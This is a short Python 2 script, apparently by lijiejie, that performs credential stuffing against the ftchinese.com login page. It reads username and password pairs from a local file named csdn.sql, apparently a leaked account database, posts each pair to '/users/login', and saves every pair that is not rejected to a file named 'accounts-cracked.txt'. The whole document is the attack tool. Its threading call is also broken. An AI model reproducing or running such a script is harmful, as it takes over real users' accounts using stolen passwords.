# -*- coding: utf-8 -*-

'''
from http://www.lijiejie.com
my[at]lijiejie.com
'''

import urllib2
import urllib
import httplib
import threading


headers = {"Content-Type":"application/x-www-form-urlencoded",     
           "Connection":"Keep-Alive",
           "Referer":"http://www.ftchinese.com/"};
lock = threading.Lock()
def tryUser():
    global headers
    global outFile 
    conn = httplib.HTTPConnection("www.ftchinese.com")
    while True:
        lock.acquire()
        line = inFile.readline()
        userData = line.strip().split(' # ')
        lock.release()
        if len(userData) != 3: continue
        if len(line) == 0:
            conn.close()
            break
        user = userData[2]
        passwd = userData[1]
        params = urllib.urlencode({'username': user, 'password': passwd})
        conn.request(method="POST", url="/users/login", body=params, headers=headers)
        responseText = conn.getresponse().read().decode('utf8')
        if not responseText.find(u'用户名或者密码不正确,请重新输入!') > 0 :
            print '*** find user:', user, 'with password:', passwd, '***'
            outFile.write(user + '    ' +  passwd + '\n')


outFile = open('accounts-cracked.txt', 'w')
with open(r'E:\works-hz\csdn.sql', 'r') as inFile:
    for i in range(5000):    #skip 5000
        inFile.readline()
    for i in range(10):
        threading.Thread(target = tryUser())


outFile.close()